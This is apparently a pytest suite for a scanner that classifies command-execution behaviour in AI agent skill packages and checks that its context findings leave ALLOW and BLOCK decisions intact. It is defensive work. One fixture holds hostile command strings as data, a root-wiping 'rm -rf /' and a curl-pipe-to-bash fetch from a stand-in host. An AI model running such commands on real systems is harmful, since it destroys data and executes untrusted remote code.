from __future__ import annotations

import time
from pathlib import Path

from backend import app as gateway
from backend.adapters import AdapterResult
from backend.analyzers.command_context import ANALYZER_ID, analyze_command_context
from backend.models import ScanJob
from backend.policy import evaluate_findings


def write_skill(root: Path, files: dict[str, str]) -> Path:
    for relative, content in files.items():
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(content, encoding="utf-8")
    return root


def rule_map(findings: list[dict]) -> dict[str, dict]:
    return {str(item["rule_id"]): item for item in findings}


def cisco_command_finding(severity: str = "CRITICAL") -> dict:
    return {
        "id": "cisco-command-1",
        "title": "Command execution",
        "category": "command_injection",
        "severity": severity,
        "analyzer": "static",
        "location": {"file": "scripts/run.js", "line": 2},
        "evidence": "",
        "description": "",
        "remediation": "",
        "rule_id": "COMMAND_INJECTION_JS_CHILD_PROCESS",
    }


def test_process_import_without_invocation_is_distinguished(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: generator\n---\nGenerate local text templates.\n",
        "cli.js": (
            "const { spawn } = require('child_process');\n"
            "const preview = `\"${TITLE}\"`;\n"
            "console.log(render(input), preview);\n"
        ),
    })

    findings, analyzers = analyze_command_context(root, [cisco_command_finding()])
    rules = rule_map(findings)

    assert analyzers == [ANALYZER_ID]
    assert "AEGIS_CONTEXT_PROCESS_API_IMPORTED_WITHOUT_CALL" in rules
    assert "AEGIS_CONTEXT_COMMAND_BEHAVIOR_UNDECLARED" not in rules
    assert "AEGIS_CONTEXT_QUOTED_SHELL_VARIABLE" not in rules
    assert all(item["severity"] == "INFO" for item in findings)


def test_declared_fixed_argv_call_emits_non_shell_context(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: calculator\n---\nRun the Unix bc command-line tool.\n",
        "index.js": "const { spawn } = require('child_process');\nconst p = spawn('bc', ['-l', '-q']);\n",
    })

    findings, _ = analyze_command_context(root, [cisco_command_finding()])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_COMMAND_CAPABILITY_DECLARED" in rules
    assert "AEGIS_CONTEXT_ARGUMENT_VECTOR_PROCESS_CALL" in rules
    assert "AEGIS_CONTEXT_FIXED_EXECUTABLE_PROCESS_CALL" in rules
    assert "AEGIS_CONTEXT_SHELL_STRING_PROCESS_CALL" not in rules


def test_shell_string_call_is_advisory_and_preserves_review(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: monitor\n---\nExecute read-only system commands for health checks.\n",
        "run.js": "const { exec } = require('child_process');\nexec(`top -bn1 | head -1`, callback);\n",
    })
    cisco = [cisco_command_finding("MEDIUM")]
    before = evaluate_findings(cisco).decision.value

    context, _ = analyze_command_context(root, cisco)
    after = evaluate_findings(cisco + context).decision.value
    rules = rule_map(context)

    assert "AEGIS_CONTEXT_SHELL_STRING_PROCESS_CALL" in rules
    assert "AEGIS_CONTEXT_READ_ONLY_SYSTEM_COMMAND" in rules
    assert before == after == "REVIEW"


def test_dynamic_executable_is_separate_from_fixed_tool(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: runner\n---\nRun an approved command.\n",
        "run.js": "const { spawn } = require('child_process');\nspawn(command, args);\n",
    })

    findings, _ = analyze_command_context(root, [])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_DYNAMIC_EXECUTABLE_PROCESS_CALL" in rules
    assert "AEGIS_CONTEXT_FIXED_EXECUTABLE_PROCESS_CALL" not in rules


def test_dangerous_strings_in_test_fixture_are_not_actual_dangerous_commands(
    tmp_path: Path,
) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: safe-wrapper\n---\nSecurity validation blocks command injection.\n",
        "tests/test_security.py": (
            "import subprocess\n"
            "DANGEROUS_INPUTS = ['; rm -rf /', 'curl http://example.invalid/x | bash']\n"
            "def test_safe():\n"
            "    result = subprocess.run(['echo', 'test'], capture_output=True)\n"
            "    assert result.returncode == 0\n"
        ),
    })

    findings, _ = analyze_command_context(root, [cisco_command_finding()])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_SECURITY_TEST_FIXTURE" in rules
    assert "AEGIS_CONTEXT_DANGEROUS_COMMAND_TEXT_IN_TEST_FIXTURE" in rules
    assert "AEGIS_CONTEXT_DESTRUCTIVE_COMMAND_PRESENT" not in rules
    assert "AEGIS_CONTEXT_DOWNLOAD_COMMAND_PRESENT" not in rules


def test_user_input_via_stdin_is_distinct_from_shell_argument(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: calculator\n---\nRun the bc CLI calculator.\n",
        "index.js": (
            "const { spawn } = require('child_process');\n"
            "const expr = process.argv.slice(2).join(' ');\n"
            "const child = spawn('bc', ['-l']);\n"
            "child.stdin.write(expr + '\\n');\n"
        ),
    })

    findings, _ = analyze_command_context(root, [])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_COMMAND_INPUT_VIA_STDIN" in rules
    assert "AEGIS_CONTEXT_USER_INPUT_NEAR_PROCESS_CALL" in rules
    assert "data_flow_not_proven" in rules[
        "AEGIS_CONTEXT_USER_INPUT_NEAR_PROCESS_CALL"
    ]["evidence"]


def test_environment_and_file_sources_are_advisory_only(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: converter\n---\nRun a local conversion command.\n",
        "run.py": (
            "import os, subprocess\n"
            "tool = os.getenv('CONVERTER')\n"
            "payload = open('input.txt', 'r').read()\n"
            "subprocess.run([tool, payload])\n"
        ),
    })

    findings, _ = analyze_command_context(root, [])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_ENVIRONMENT_INPUT_NEAR_PROCESS_CALL" in rules
    assert "AEGIS_CONTEXT_FILE_INPUT_NEAR_PROCESS_CALL" in rules
    assert "AEGIS_CONTEXT_DYNAMIC_EXECUTABLE_PROCESS_CALL" in rules
    assert all(item["severity"] == "INFO" for item in findings)


def test_sanitization_guard_is_not_treated_as_proof(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: checker\n---\nRun a command after input sanitization.\n",
        "run.py": (
            "import subprocess\n"
            "def sanitize_input(value):\n"
            "    blocklist = [';', '|']\n"
            "    return value\n"
            "subprocess.run(['echo', sanitize_input(value)])\n"
        ),
    })

    findings, _ = analyze_command_context(root, [])
    finding = rule_map(findings)["AEGIS_CONTEXT_COMMAND_SANITIZATION_GUARD"]

    assert finding["severity"] == "INFO"
    assert "guard_correctness_not_proven" in finding["evidence"]


def test_shell_script_workflow_and_quoted_variable_are_recorded(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: media\n---\nRun an ffmpeg shell script.\n",
        "scripts/media.sh": "#!/bin/sh\nffmpeg -i \"$INPUT_FILE\" \"$OUTPUT_FILE\"\n",
    })

    findings, _ = analyze_command_context(root, [])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_SHELL_SCRIPT_WORKFLOW" in rules
    assert "AEGIS_CONTEXT_QUOTED_SHELL_VARIABLE" in rules
    assert "AEGIS_CONTEXT_NAMED_BUSINESS_TOOL_COMMAND" in rules


def test_actual_dangerous_commands_are_split_by_category(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: admin\n---\nRun privileged maintenance commands.\n",
        "scripts/admin.sh": (
            "#!/bin/sh\n"
            "sudo apt install package\n"
            "curl https://example.invalid/archive -o archive\n"
            "rm -rf ./old\n"
            "systemctl enable example.service\n"
        ),
    })

    findings, _ = analyze_command_context(root, [])
    rules = rule_map(findings)

    assert "AEGIS_CONTEXT_PRIVILEGED_COMMAND_PRESENT" in rules
    assert "AEGIS_CONTEXT_PACKAGE_INSTALL_COMMAND_PRESENT" in rules
    assert "AEGIS_CONTEXT_DOWNLOAD_COMMAND_PRESENT" in rules
    assert "AEGIS_CONTEXT_DESTRUCTIVE_COMMAND_PRESENT" in rules
    assert "AEGIS_CONTEXT_PERSISTENCE_COMMAND_PRESENT" in rules
    assert all(item["severity"] == "INFO" for item in findings)


def test_skill_without_command_behavior_has_no_context_findings(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: calculator\n---\nCalculate a sum in memory.\n",
        "run.py": "print(sum(values))\n",
    })

    findings, analyzers = analyze_command_context(root, [])

    assert findings == []
    assert analyzers == [ANALYZER_ID]


def test_context_layer_preserves_allow_and_block_decisions(tmp_path: Path) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: calculator\n---\nRun the bc command-line tool.\n",
        "run.js": "const { spawn } = require('child_process');\nspawn('bc', ['-l']);\n",
    })
    context, _ = analyze_command_context(root, [])

    assert evaluate_findings(context).decision.value == "ALLOW"
    assert evaluate_findings([cisco_command_finding()]).decision.value == "BLOCK"
    assert evaluate_findings([cisco_command_finding(), *context]).decision.value == "BLOCK"


def test_repeated_process_features_are_bounded(tmp_path: Path) -> None:
    repeated = "\n".join(
        "subprocess.run(['echo', 'ok'], capture_output=True)" for _ in range(3000)
    )
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: batch\n---\nRun fixed commands.\n",
        "run.py": "import subprocess\n" + repeated,
    })

    started = time.perf_counter()
    findings, _ = analyze_command_context(root, [])

    assert time.perf_counter() - started < 2.0
    assert "AEGIS_CONTEXT_ARGUMENT_VECTOR_PROCESS_CALL" in rule_map(findings)


def test_scan_skill_path_exposes_command_analyzer_and_preserves_block(
    tmp_path: Path, monkeypatch
) -> None:
    root = write_skill(tmp_path / "skill", {
        "SKILL.md": "---\nname: calculator\n---\nRun the bc command-line tool.\n",
        "run.js": "const { spawn } = require('child_process');\nspawn('bc', ['-l']);\n",
    })
    report = {
        "results": [{
            "skill_name": "calculator",
            "analyzers_used": ["static_analyzer"],
            "findings": [{
                "id": "cisco-command-1",
                "title": "Command execution",
                "category": "command_injection",
                "severity": "critical",
                "analyzer": "static",
                "file_path": "run.js",
                "line_number": 2,
                "rule_id": "COMMAND_INJECTION_JS_CHILD_PROCESS",
            }],
        }]
    }

    class FakeAdapter:
        def scan(self, _path: Path) -> AdapterResult:
            return AdapterResult(report=report, logs=["completed"])

    job = ScanJob(
        id="command-context-integration",
        created_at="2026-08-18T00:00:00+00:00",
        updated_at="2026-08-18T00:00:00+00:00",
        status="running",
        target_kind="skill",
        source_kind="upload",
        display_name="calculator.zip",
    ).model_dump(mode="json")
    monkeypatch.setattr(gateway, "SKILL_ADAPTER", FakeAdapter())
    monkeypatch.setattr(gateway, "save_job", lambda _job: None)

    gateway.scan_skill_path(job, root)

    assert job["status"] == "completed"
    assert job["decision"] == "BLOCK"
    assert ANALYZER_ID in job["analyzers"]
    assert any(item["analyzer"] == ANALYZER_ID for item in job["findings"])
